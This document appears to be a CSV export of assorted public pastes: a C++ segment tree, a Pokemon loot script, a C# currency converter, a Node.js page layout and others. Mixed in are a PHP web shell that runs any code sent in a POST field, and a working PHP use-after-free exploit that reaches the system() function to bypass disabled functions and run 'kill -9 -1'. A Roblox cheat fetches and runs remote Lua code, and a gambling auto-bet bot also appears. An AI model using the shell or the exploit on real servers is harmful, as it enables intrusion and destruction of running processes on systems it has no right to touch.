id,title,username,language,date,content
0f63tF1T,Untitled,ProgMe,C++,Friday 5th of January 2024 02:43:40 AM CDT,"#include <bits/stdc++.h>
#define int int64_t

using namespace std;

int n = 100000;

vector<int> a;
vector<int> t_min, t_max;

void build(int v = 1, int tl = 0, int tr = n - 1) {
    if (tl == tr) {
        t_min[v] = t_max[v] = a[tl];
        return;
    }

    int tm = (tl + tr) / 2;

    build(v * 2, tl, tm);
    build(v * 2 + 1, tm + 1, tr);

    t_min[v] = min(t_min[v * 2], t_min[v * 2 + 1]);
    t_max[v] = max(t_max[v * 2], t_max[v * 2 + 1]);
}

void update(int i, int x, int v = 1, int tl = 0, int tr = n - 1) {
    if (tl == tr) {
        a[tl] = x;
        t_min[v] = t_max[v] = a[tl];
        return;
    }

    int tm = (tl + tr) / 2;

    if (i <= tm) {
        update(i, x, v * 2, tl, tm);
    } else {
        update(i, x, v * 2 + 1, tm + 1, tr);
    }

    t_min[v] = min(t_min[v * 2], t_min[v * 2 + 1]);
    t_max[v] = max(t_max[v * 2], t_max[v * 2 + 1]);
}

pair<int, int> get(int l, int r, int v = 1, int tl = 0, int tr = n - 1) {
    if (l > r) {
        return {numeric_limits<int>::max(), numeric_limits<int>::min()};
    }
    if (l == tl && r == tr) {
        return {t_min[v], t_max[v]};
    }

    int tm = (tl + tr) / 2;

    pair<int, int> ans_l = get(l, min(r, tm), v * 2, tl, tm);
    pair<int, int> ans_r = get(max(l, tm + 1), r, v * 2 + 1, tm + 1, tr);

    return {min(ans_l.first, ans_r.first), max(ans_l.second, ans_r.second)};
}

int32_t main() {
    ios::sync_with_stdio(false);
    cin.tie(nullptr);
    
    a.resize(n);
    t_min.resize(4 * n);
    t_max.resize(4 * n);

    for (int i = 1; i <= n; i++) {
        a[i - 1] = i * i % 12345 + i * i * i % 23456;
    }
    build();

    int q;
    cin >> q;
    while (q--) {

        int i;
        cin >> i;

        if (i < 0) {
            int x;
            cin >> x;
            i = abs(i) - 1;

            update(i, x);
        } else {
            int l = i, r;
            cin >> r;
            l--, r--;

            pair<int, int> ans = get(l, r);

            cout << ans.second - ans.first << '\n';
        }
    }
}"
UyKmkNhj,Pet Simulator 99! 🎉 2024 AutoFarm Script,Project-WD,Lua,Friday 5th of January 2024 02:39:15 AM CDT,"--Pet Simulator 99! 🎉 AutoFarm Script! (Copy and Put in Executor)(Working: Delta and ArceusX etc...)
-------------------------------------------------------
--🆕 Updated (05/01/2024) (Insane Script)
-- Auto Farm, Auto Ranks, Boothsnipe, No Egg Animation, etc...
--Script📝:
loadstring(game:HttpGet(""https://raw.githubusercontent.com/REDzHUBz/PetSimulator99/main/redz9999.lua"" ))()"
LBSUZE9D,Untitled,TakePen,AutoIt,Friday 5th of January 2024 02:03:17 AM CDT,"fire 2x (ranger assa)
+45^ench 2x (ranger assa)
vamp scythe 2x (assa necro)
frog divine q9
cc divine q9
cc dom q9
bds Cursed q13 (para)
Vamp spear (para)
ench spear (para)
serenity now 10% (uw ranger)"
w7MXaZZH,take a guess~???,nitestryker,C,Friday 5th of January 2024 12:19:47 AM CDT,"#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>

#define NUM_THREADS 10
#define MAX_CONNECTIONS 100

pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;
int client_sockets[MAX_CONNECTIONS];
char* host = ""localhost"";
int port = 80;

void *start_connection(void *arg) {
    while (1) {
        int client_sock;
        struct sockaddr_in serv_addr;
        socklen_t sockfd_size = sizeof(struct sockaddr);

        if (!pthread_mutex_lock(&mutex)) {
            // Check if there's an available socket in the pool
            for (int i = 0; i < MAX_CONNECTIONS; i++) {
                if (client_sockets[i] != -1) {
                    client_sock = client_sockets[i];
                    client_sockets[i] = -1; // Mark the socket as in use
                    break;
                }
            }
            pthread_mutex_unlock(&mutex);

            if (client_sock == -1) {
                // No available socket in the pool, create a new one
                if ((client_sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1) {
                    perror(""socket"");
                    exit(EXIT_FAILURE);
                }

                memset(&serv_addr, 0, sockfd_size);
                serv_addr.sin_family = AF_INET;
                serv_addr.sin_port = htons(port);
                inet_pton(AF_INET, host, &serv_addr.sin_addr);

                if (connect(client_sock, (struct sockaddr *)&serv_addr, sockfd_size) != 0) {
                    perror(""connect"");
                    close(client_sock);
                    continue;
                }
            }

            printf(""Connected to %s:%d...\n"", host, port);
            sleep(1);
            
            // Return the socket to the pool
            if (!pthread_mutex_lock(&mutex)) {
                for (int i = 0; i < MAX_CONNECTIONS; i++) {
                    if (client_sockets[i] == -1) {
                        client_sockets[i] = client_sock;
                        break;
                    }
                }
                pthread_mutex_unlock(&mutex);
            }

            close(client_sock);
            break;
        }
    }

    pthread_exit(NULL);
}

int main() {
    pthread_t tid[NUM_THREADS];
    pthread_attr_t attr;
    pthread_mutex_init(&mutex, NULL);

    // Initialize the client socket pool
    for (int i = 0; i < MAX_CONNECTIONS; i++) {
        client_sockets[i] = -1;
    }

    for (int i = 0; i < NUM_THREADS; i++) {
        pthread_create(&tid[i], NULL, start_connection, NULL);
    }

    for (int i = 0; i < NUM_THREADS; i++) {
        pthread_join(tid[i], NULL);
    }

    pthread_mutex_destroy(&mutex);
    return 0;
}
"
Bisea38J,Untitled,Sonicover,Ruby,Thursday 4th of January 2024 11:53:31 PM CDT,"def chooseRandomItem(qty=1)
  #Item Groups
  groups = [
  :MEDICINE,
  :POKEBALL,
  :EVOLUTION,
  :UTILITY
  ]
 
  #Array of items
  commonMeds = [
  :POTION,
  :BURNHEAL,
  :AWAKENING
  ]
 
  commonBalls = [
  :POKEBALL,
  :NESTBALL,
  :NETBALL
  ]
 
  commonEvo = [
  :STRAWBERRYSWEET,
  :WATERSTONE,
  :FIRESTONE,
  :THUNDERSTONE,
  :LEAFSTONE
  ]
 
  commonUtil = [
  :REPEL
  ]  
 
  uncommonMeds = [
  :SUPERPOTION,
  :ANTIDOTE,
  :PARALYZEHEAL,
  :FULLHEAL
  ]
 
  uncommonBalls = [
  :GREATBALL,
  :DIVEBALL,
  :HEALBALL,
  :DUSKBALL
  ]
 
  uncommonEvo = [
  :METALCOAT,
  :KINGSROCK,
  :REAPERCLOTH,
  :CHIPPEDPOT,
  :CRACKEDPOT,
  :LINKCABLE,
  :LEADERSCREST,
  :MASTERPIECETEACUP,
  :UNREMARKABLETEACUP,
  :MOONSTONE,
  :SUNSTONE,
  :ICESTONE
  ]  
 
  uncommonUtil = [
  :SUPERREPEL
  ]  
 
  epicMeds = [
  :HYPERPOTION,
  :ICEHEAL
  ]
 
  epicBalls = [
  :ULTRABALL,
  :QUICKBALL,
  :REPEATBALL
  ]
 
 
  epicEvo = [
  :DEEPSEATOOTH,
  :DEEPSEASCALE,
  :OVALSTONE,
  :GALARICACUFF,
  :GALARICAWREATH,
  :SCROLLOFWATERS,
  :SCROLLOFDARKNESS
  ]
 
  epicUtil = [
  :MAXREPEL
  ]  
 
  legendaryMeds = [
  :MAXPOTION,
  :FULLRESTORE
  ]
 
  legendaryBalls = [
  :MASTERBALL
  ]
 
 
  legendaryEvo = [
  :SWEETAPPLE,
  :DRAGONSCALE,
  :UPGRADE,
  :DUBIOUSDISK,
  :PROTECTOR,
  :ELECTRIZER,
  :MAGMARIZER,
  :RAZORFANG,
  :RAZORCLAW,
  :PRISMSCALE,
  :WHIPPEDDREAM,
  :SACHET,
  :TARTAPPLE,
  :SWEETAPPLE,
  :BLACKAUGURITE,
  :PEATBLOCK,
  :AUSPICIOUSARMOR,
  :MALICIOUSARMOR,
  :SYRUPAPPLE,
  :DAWNSTONE,
  :DUSKSTONE,
  :SHINYSTONE
  ]
 
 
  #Randomly select Group
  itemtype = rand(4)
  itemrarity = rand(10)
	if itemtype == 1
		if itemrarity < 1
			pbMessage(_INTL(""You received a Legendary Medicine loot drop!""))
			pbReceiveItem(legendaryMeds[rand(0...legendaryMeds.length)],qty)
		elsif itemrarity <2
			pbMessage(_INTL(""You received an Epic Medicine loot drop!""))	
			pbReceiveItem(epicMeds[rand(0...epicMeds.length)],qty)
		elsif itemrarity <4
			pbMessage(_INTL(""You received an Uncommon Medicine loot drop!""))
			pbReceiveItem(uncommonMeds[rand(0...uncommonMeds.length)],qty)	  
		else
			pbMessage(_INTL(""You received a Common Medicine loot drop!""))	
			pbReceiveItem(commonMeds[rand(0...commonMeds.length)],qty)
		end	
	elsif itemtype == 2
		if itemrarity < 1 
			pbMessage(_INTL(""You received a Legendary Pokeball loot drop!""))
			pbReceiveItem(legendaryBalls[rand(0...legendaryBalls.length)],qty)
		elsif itemrarity < 2 
			pbMessage(_INTL(""You received an Epic Pokeball loot drop!""))	
			pbReceiveItem(epicBalls[rand(0...epicBalls.length)],qty)
		elsif itemrarity < 4
			pbMessage(_INTL(""You received an Uncommon Pokeball loot drop!""))
			pbReceiveItem(uncommonBalls[rand(0...uncommonBalls.length)],qty)	  
		else
			pbMessage(_INTL(""You received a Common Pokeball loot drop!""))	
			pbReceiveItem(commonBalls[rand(0...commonBalls.length)],qty)
		end
	elsif itemtype == 3
		if itemrarity < 1
			pbMessage(_INTL(""You received a Legendary Evolution loot drop!""))
			pbReceiveItem(legendaryEvo[rand(0...legendaryEvo.length)],qty)
		elsif itemrarity < 2
			pbMessage(_INTL(""You received an Epic Evolution loot drop!""))	
			pbReceiveItem(epicEvo[rand(0...epicEvo.length)],qty)
		elsif itemrarity < 4
			pbMessage(_INTL(""You received an Uncommon Evolution loot drop!""))
			pbReceiveItem(uncommonEvo[rand(0...uncommonEvo.length)],qty)	  
		else
			pbMessage(_INTL(""You received a Common Evolution loot drop!""))	
			pbReceiveItem(commonEvo[rand(0...commonEvo.length)],qty)
		end
	else #itemtype == 4
		if itemrarity < 2
			pbMessage(_INTL(""You received an Epic Utility loot drop!""))	
			pbReceiveItem(epicUtil[rand(0...epicUtil.length)],qty)
		elsif itemrarity < 4
			pbMessage(_INTL(""You received an Uncommon Utility loot drop!""))
			pbReceiveItem(uncommonUtil[rand(0...uncommonUtil.length)],qty)	  
		else
			pbMessage(_INTL(""You received a Common Utility loot drop!""))	
			pbReceiveItem(commonUtil[rand(0...commonUtil.length)],qty)
		end
	end
end"
7PD7cX4A,erc.el diff,brickviking,Diff,Thursday 4th of January 2024 11:10:13 PM CDT,"--- erc.el~     2023-11-18 23:46:25.014693325 +1300
+++ erc.el      2024-01-04 20:05:21.267792296 +1300
@@ -1,6 +1,6 @@
 ;;; erc.el --- An Emacs Internet Relay Chat client  -*- lexical-binding:t -*-

-;; Copyright (C) 1997-2023 Free Software Foundation, Inc.
+;; Copyright (C) 1997-2024 Free Software Foundation, Inc.

 ;; Author: Alexander L. Belikoff <alexander@belikoff.net>
 ;; Maintainer: Amin Bandali <bandali@gnu.org>, F. Jason Park <jp@neverwas.me>
@@ -1002,7 +1002,7 @@

 ;; variables available for IRC scripts

-(defvar erc-user-information ""ERC User""
+(defvar erc-user-information ""umm...dunno. User uses something I guess.""
   ""USER_INFORMATION IRC variable."")

 ;; Hooks"
USLujraK,RCE Post Shell,willysec_id,PHP,Thursday 4th of January 2024 10:49:15 PM CDT,"<?php
class  Test{
    public $name = '';
    function __destruct(){
        @eval(""$this->name"");
    }
} 
$test= new Test();
$c = @$_POST['css'];
$test->name = $c;
?>egm"
r2zyaQD5,Bypass Kill System Process,willysec_id,PHP,Thursday 4th of January 2024 10:10:57 PM CDT,"<?php
opcache_reset();
new Pwn(""kill -9 -1"");

class Helper { public $a, $b, $c; }
class Pwn {
    const LOGGING = false;
    const CHUNK_DATA_SIZE = 0x60;
    const CHUNK_SIZE = ZEND_DEBUG_BUILD ? self::CHUNK_DATA_SIZE + 0x20 : self::CHUNK_DATA_SIZE;
    const STRING_SIZE = self::CHUNK_DATA_SIZE - 0x18 - 1;

    const HT_SIZE = 0x118;
    const HT_STRING_SIZE = self::HT_SIZE - 0x18 - 1;

    public function __construct($cmd) {
        for($i = 0; $i < 10; $i++) {
            $groom[] = self::alloc(self::STRING_SIZE);
            $groom[] = self::alloc(self::HT_STRING_SIZE);
        }
        
        $concat_str_addr = self::str2ptr($this->heap_leak(), 16);
        $fill = self::alloc(self::STRING_SIZE);

        $this->abc = self::alloc(self::STRING_SIZE);
        $abc_addr = $concat_str_addr + self::CHUNK_SIZE;
        self::log(""abc @ 0x%x"", $abc_addr);

        $this->free($abc_addr);
        $this->helper = new Helper;
        if(strlen($this->abc) < 0x1337) {
            self::log(""uaf failed"");
            return;
        }

        $this->helper->a = ""leet"";
        $this->helper->b = function($x) {};
        $this->helper->c = 0xfeedface;

        $helper_handlers = $this->rel_read(0);
        self::log(""helper handlers @ 0x%x"", $helper_handlers);

        $closure_addr = $this->rel_read(0x20);
        self::log(""real closure @ 0x%x"", $closure_addr);

        $closure_ce = $this->read($closure_addr + 0x10);
        self::log(""closure class_entry @ 0x%x"", $closure_ce);
        
        $basic_funcs = $this->get_basic_funcs($closure_ce);
        self::log(""basic_functions @ 0x%x"", $basic_funcs);

        $zif_system = $this->get_system($basic_funcs);
        self::log(""zif_system @ 0x%x"", $zif_system);

        $fake_closure_off = 0x70;
        for($i = 0; $i < 0x138; $i += 8) {
            $this->rel_write($fake_closure_off + $i, $this->read($closure_addr + $i));
        }
        $this->rel_write($fake_closure_off + 0x38, 1, 4);
        $handler_offset = PHP_MAJOR_VERSION === 8 ? 0x70 : 0x68;
        $this->rel_write($fake_closure_off + $handler_offset, $zif_system);

        $fake_closure_addr = $abc_addr + $fake_closure_off + 0x18;
        self::log(""fake closure @ 0x%x"", $fake_closure_addr);

        $this->rel_write(0x20, $fake_closure_addr);
        ($this->helper->b)($cmd);

        $this->rel_write(0x20, $closure_addr);
        unset($this->helper->b);
    }

    private function heap_leak() {
        $arr = [[], []];
        set_error_handler(function() use (&$arr, &$buf) {
            $arr = 1;
            $buf = str_repeat(""\x00"", self::HT_STRING_SIZE);
        });
        $arr[1] .= self::alloc(self::STRING_SIZE - strlen(""Array""));
        return $buf;
    }

    private function free($addr) {
        $payload = pack(""Q*"", 0xdeadbeef, 0xcafebabe, $addr);
        $payload .= str_repeat(""A"", self::HT_STRING_SIZE - strlen($payload));
        
        $arr = [[], []];
        set_error_handler(function() use (&$arr, &$buf, &$payload) {
            $arr = 1;
            $buf = str_repeat($payload, 1);
        });
        $arr[1] .= ""x"";
    }

    private function rel_read($offset) {
        return self::str2ptr($this->abc, $offset);
    }

    private function rel_write($offset, $value, $n = 8) {
        for ($i = 0; $i < $n; $i++) {
            $this->abc[$offset + $i] = chr($value & 0xff);
            $value >>= 8;
        }
    }

    private function read($addr, $n = 8) {
        $this->rel_write(0x10, $addr - 0x10);
        $value = strlen($this->helper->a);
        if($n !== 8) { $value &= (1 << ($n << 3)) - 1; }
        return $value;
    }

    private function get_system($basic_funcs) {
        $addr = $basic_funcs;
        do {
            $f_entry = $this->read($addr);
            $f_name = $this->read($f_entry, 6);
            if($f_name === 0x6d6574737973) {
                return $this->read($addr + 8);
            }
            $addr += 0x20;
        } while($f_entry !== 0);
    }

    private function get_basic_funcs($addr) {
        while(true) {
            $addr -= 0x10;
            if($this->read($addr, 4) === 0xA8 &&
                in_array($this->read($addr + 4, 4),
                    [20180731, 20190902, 20200930, 20210902])) {
                $module_name_addr = $this->read($addr + 0x20);
                $module_name = $this->read($module_name_addr);
                if($module_name === 0x647261646e617473) {
                    self::log(""standard module @ 0x%x"", $addr);
                    return $this->read($addr + 0x28);
                }
            }
        }
    }

    private function log($format, $val = """") {
        if(self::LOGGING) {
            printf(""{$format}\n"", $val);
        }
    }

    static function alloc($size) {
        return str_shuffle(str_repeat(""A"", $size));
    }

    static function str2ptr($str, $p = 0, $n = 8) {
        $address = 0;
        for($j = $n - 1; $j >= 0; $j--) {
            $address <<= 8;
            $address |= ord($str[$p + $j]);
        }
        return $address;
    }
}

?>"
Q6nsa6TL,C#_2_lesson_currency_exchange,Legiomax,C#,Thursday 4th of January 2024 09:54:32 PM CDT,"using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace C_Ijun
{
    internal class Program
    {
        static void Main(string[] args)
        {
            const string CommandExchangeRubToUsd = ""exchange rubls by dollars"";
            const string CommandExchangeRubToCny = ""exchange rubls by yuan"";
            const string CommandExchangeUsdToCny = ""exchange dollars by yuan"";
            const string CommandExchangeUsdToRub = ""exchange dollars by rubls"";
            const string CommandExchangeCnyToRub = ""exchange yuan by rubls"";
            const string CommandExchangeCnyToUsd = ""exchange yuan by dollars"";
            const string CommandInfoBalance = ""info by balance"";
            const string CommandExit = ""exit"";

            bool isWork = true;

            float countOfRub;
            float countOfUsd;
            float countOfCny;
            float sumForExchange;
            float rubToUsd = 0.011f;
            float rubToCny = 0.078f;
            float usdToRub = 91.35f;
            float usdToCny = 7.12f;
            float cnyToUsd = 0.14f;
            float cnyToRub = 12.83f;

            string userChoice;

            Console.WriteLine(""Конвертер валют."");
            Console.Write(""Введите баланс рублей: "");
            countOfRub = Convert.ToSingle(Console.ReadLine());

            Console.Write(""Введите баланс долларов: "");
            countOfUsd = Convert.ToSingle(Console.ReadLine());

            Console.Write(""Введите баланс юаней: "");
            countOfCny = Convert.ToSingle(Console.ReadLine());

            while (isWork)
            {
                Console.WriteLine(""Выбрать действие:"");
                Console.WriteLine(""exchange rubls by dollars - Обменять рубли на доллары."");
                Console.WriteLine(""exchange rubls by yuan - Обменять рубли на юани."");
                Console.WriteLine(""exchange dollars by yuan - Обменять доллары на юани."");
                Console.WriteLine(""exchange dollars by rubls - Обменять доллары на рубли."");
                Console.WriteLine(""exchange yuan by rubls - Обменять юани на рубли."");
                Console.WriteLine(""exchange yuan by dollars - Обменять юани на доллары."");
                Console.WriteLine(""info by balance - Узнать баланс."");
                Console.WriteLine(""exit - Выход из программы."");

                userChoice = Console.ReadLine();

                switch (userChoice)
                {
                    case CommandExchangeRubToUsd:
                        Console.Write(""Обменять рубли на доллары.\nСумма для обмена: "");
                        sumForExchange = Convert.ToSingle(Console.ReadLine());

                        if (countOfRub >= sumForExchange)
                        {
                            countOfRub -= sumForExchange;
                            countOfUsd += sumForExchange * rubToUsd;
                            Console.Write($""Баланс:\nРублей: {countOfRub}\nДолларов: {countOfUsd}"");
                        }
                        else
                        {
                            Console.Write(""Недостаточно суммы для обмена."");
                        }
                        break;

                    case CommandExchangeRubToCny:
                        Console.Write(""Обменять рубли на юани.\nСумма для обмена: "");
                        sumForExchange = Convert.ToSingle(Console.ReadLine());

                        if (countOfRub >= sumForExchange)
                        {
                            countOfRub -= sumForExchange;
                            countOfCny += sumForExchange * rubToCny;
                            Console.Write($""Баланс:\nРублей: {countOfRub}\nЮаней: {countOfCny}"");
                        }
                        else
                        {
                            Console.Write(""Недостаточно суммы для обмена."");
                        }
                        break;

                    case CommandExchangeUsdToCny:
                        Console.Write(""Обменять доллары на юани.\nСумма для обмена: "");
                        sumForExchange = Convert.ToSingle(Console.ReadLine());

                        if (countOfUsd >= sumForExchange)
                        {
                            countOfUsd -= sumForExchange;
                            countOfCny += sumForExchange * usdToCny;
                            Console.Write($""Баланс:\nДолларов: {countOfUsd}\nЮаней: {countOfCny}"");
                        }
                        else
                        {
                            Console.Write(""Недостаточно суммы для обмена."");
                        }
                        break;

                    case CommandExchangeUsdToRub:
                        Console.Write(""Обменять доллары на рубли.\nСумма для обмена: "");
                        sumForExchange = Convert.ToSingle(Console.ReadLine());

                        if (countOfUsd >= sumForExchange)
                        {
                            countOfUsd -= sumForExchange;
                            countOfRub += sumForExchange * usdToRub;
                            Console.Write($""Баланс:\nДолларов: {countOfUsd}\nРублей: {countOfRub}"");
                        }
                        else
                        {
                            Console.Write(""Недостаточно суммы для обмена."");
                        }
                        break;

                    case CommandExchangeCnyToRub:
                        Console.Write(""Обменять юани на рубли.\nСумма для обмена: "");
                        sumForExchange = Convert.ToSingle(Console.ReadLine());

                        if (countOfCny >= sumForExchange)
                        {
                            countOfCny -= sumForExchange;
                            countOfRub += sumForExchange * cnyToRub;
                            Console.Write($""Баланс:\nЮаней: {countOfCny}\nРублей: {countOfRub}"");
                        }
                        else
                        {
                            Console.Write(""Недостаточно суммы для обмена."");
                        }
                        break;

                    case CommandExchangeCnyToUsd:
                        Console.Write(""Обменять юани на доллары.\nСумма для обмена: "");
                        sumForExchange = Convert.ToSingle(Console.ReadLine());

                        if (countOfCny >= sumForExchange)
                        {
                            countOfCny -= sumForExchange;
                            countOfUsd += sumForExchange * cnyToUsd;
                            Console.Write($""Баланс:\nЮаней: {countOfCny}\nДолларов: {countOfUsd}"");
                        }
                        else
                        {
                            Console.Write(""Недостаточно суммы для обмена."");
                        }
                        break;

                    case CommandInfoBalance:
                        Console.Write($""Ваш баланс:\nРубли: {countOfRub}\nДоллары: {countOfUsd}\nЮани: {countOfCny}"");
                        break;

                    case CommandExit:
                        Console.Write(""Это конец..."");
                        isWork = false;
                        break;
                }

                Console.Write(""\nНажмите любую клавишу."");
                Console.ReadKey();
                Console.Clear();
            }
        }
    }
}
"
cex3BtLJ,best snowybot now good,coinwalk,JavaScript,Thursday 4th of January 2024 09:40:06 PM CDT,"var oldestbal = parseFloat(document.getElementById('pct_balance').value);
var base = (oldestbal/1440000)
var bellance = oldestbal;
var botplus = base;
var trget = parseFloat(oldestbal);
var tens = (base*10);
var sevens = (base*6.9);
var eights  = (base*7.1)
var floatingbal = 0;
var fran = oldestbal;
var betnext = ((botplus*1).toFixed(8));
 
 
function get(){
console.clear();
bellance = document.getElementById('pct_balance').value;
var good = ((bellance-oldestbal).toFixed(8));
console.log(""profit"");
console.log(good);
if ((bellance>(((Math.floor(bellance/tens))*tens)+sevens))&&(bellance<(((Math.floor(bellance/tens))*tens)+eights))&&(bellance!=floatingbal)) {
     botplus = botplus*2;  
     floatingbal  = parseFloat(bellance);
}
if ((botplus>=(base*3))&&(bellance>=fran)&&(bellance<(((Math.floor(bellance/tens))*tens)+sevens))){
    botplus = base;
    floatingbal = 0;
    fran  = parseFloat(bellance); 
}
if (bellance>(trget*24)){
console.log(""buy ebike"");
return;
}
betnext = ((botplus*1).toFixed(8));
$('#pct_chance').val(49.5);
$('#pct_bet').val(betnext);
$('#a_hi').click();
setTimeout(() => get(), 100);
}
get();"
uMqy5n5X,Untitled,cwunder,TypeScript,Thursday 4th of January 2024 09:05:20 PM CDT,"'use client';

import * as TabsPrimitive from '@radix-ui/react-tabs';
import { useTheme } from 'next-themes';
import type { FC } from 'react';

import Button from '@/components/Common/Button';
import CodeBox from '@/components/Common/CodeBox';
import CodeTabs from '@/components/Common/CodeTabs';
import WithFooter from '@/components/withFooter';
import WithNavBar from '@/components/withNavBar';
import { useDetectOS } from '@/hooks';
import { useRouter } from '@/navigation.mjs';

const nvmContent = `# Install Node Version Manager (NVM)\ncurl -o- https://raw.githubusercontent.com/nvm-sh/nvm/master/install.sh | bash\n\n# Install Node.js\nnvm install --lts\n\n# Check that Node is installed\nnode -v\n\n# Check your NPM version\nnpm -v`;
const chocoContent = `# Install Chocolatey\nSet-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))\n\n# Install Node.js\nchoco install nodejs-lts\n\n# Check that Node is installed\nnode -v\n\n# Check your NPM version\nnpm -v`;

const downloadTabs = [
  { key: 'nvm', label: 'macOS / Linux (nvm)' },
  { key: 'choco', label: 'Windows (Chocolatey)' },
];

const HomeLayout: FC = () => {
  const { os } = useDetectOS();
  const { resolvedTheme } = useTheme();
  const { push } = useRouter();

  return (
    <>
      <WithNavBar />

      <div className=""flex flex-row"">
        <section>
          {/* code for optional banner TODO */}

          <Button
            onClick={() => push('/download')}
            variant={resolvedTheme === 'dark' ? 'special' : 'primary'}
          >
            {/* this should be i18n */}
            Download Node.js
          </Button>

          <a>
            {/* this should be i18n */}
            Get Started
          </a>
        </section>

        <section>
          <CodeTabs
            tabs={downloadTabs}
            defaultValue={os === 'WIN' ? 'choco' : 'nvm'}
            linkUrl=""/download/package-manager""
            linkText=""More Options (this should be i18n)""
          >
            <TabsPrimitive.Content value=""nvm"">
              <CodeBox language=""Bash"">
                <code>{nvmContent}</code>
              </CodeBox>
            </TabsPrimitive.Content>
            <TabsPrimitive.Content value=""choco"">
              <CodeBox language=""Bash"">
                <code>{chocoContent}</code>
              </CodeBox>
            </TabsPrimitive.Content>
          </CodeTabs>

          <span>
            {/* note this should be i18n, including the option of Chocolate or NVM */}
            Copy and paste this snippet to install Node.js LTS via{' '}
            {os === 'WIN' ? 'Chocolatey' : 'NVM'}
          </span>
        </section>
      </div>

      <WithFooter />
    </>
  );
};

export default HomeLayout;
"
zn9R0sbz,Fern Installer,clothe,Batch,Thursday 4th of January 2024 08:48:27 PM CDT,"# Fern Installer

Write-Host ""Installing Fern...""

# Create Fern script
@""
@echo off
cls
title [v1] Fern Console
prompt %CD% #
""@ | Out-File -FilePath ""fern.cmd"" -Encoding ASCII

# Installing reset script
Write-Host ""Installing reset...""

@""
@echo off
cls
prompt
cmd
""@ | Out-File -FilePath ""reset.cmd"" -Encoding ASCII

Write-Host ""Done installing Fern.""
pause
Clear-Host
Start-Process ""fern.cmd"""
nFr6inYJ,Mboc kickstarter v2 rfd,Thoughtcoder411,Bash,Thursday 4th of January 2024 08:33:02 PM CDT,"**MBOC:
**Your Source for Affordable Electronics**

Hey there!  how you been?  Its been awhile Tired of shelling out a fortune for electronics? We're constantly bombarded with posts about e-waste stores closing or moving or repair/return, but hold up - if these gadgets are bound for the trash and will never be used, why can't we have them? Better question where do we find them.. Enter MBOC - your solution to this dilemma.

We're not your run-of-the-mill company; at our core, we're a grow collective of individuals with various skills, ppassionate about ensuring everyone enjoys top-notch tech without breaking the bank.

**Our Mission:** *Deliver below-market prices of unique items to as many people as possible.*

Keeping prices low with minimal markups is our mantra. How? We've got cutting-edge systems like AI algorithms and real people on the ground, hunting down the best deals from brands like Sony and Samsung. Smart stocking as well as source buying allows us to pass on these fantastic prices to you. From TVs and laptops to DJ equipment and home goods, we've got it all.

Why pay a premium when there's an abundance of these items produced yearly? My quest to find deals for myself and friends turned into a mission: *Find the deals, share the deals.* Others resonated with this goal, understanding the issue and joining in to spread the word.

**MBOC - My Box Of Components** - encapsulates our online catalog and the unique 'pick your category' shopping experience we offer. We firmly believe everyone deserves their dream PC, server, kitchen, or car stereo. Forget guesswork - we engage directly with you, providing tools to craft your perfect box. Hobbyists? We've got your back, diving deep into your interests to source the right hardware, software, and even custom solutions.

At MBOC, you're not just a client - you're an old friend. Our reps use a tailored system, VPM, ensuring you not only get great gear but also save big on everything you purchase.

Ready to dive into the world of affordable electronics tailored just for you? Welcome to MBOC. We missed ya "
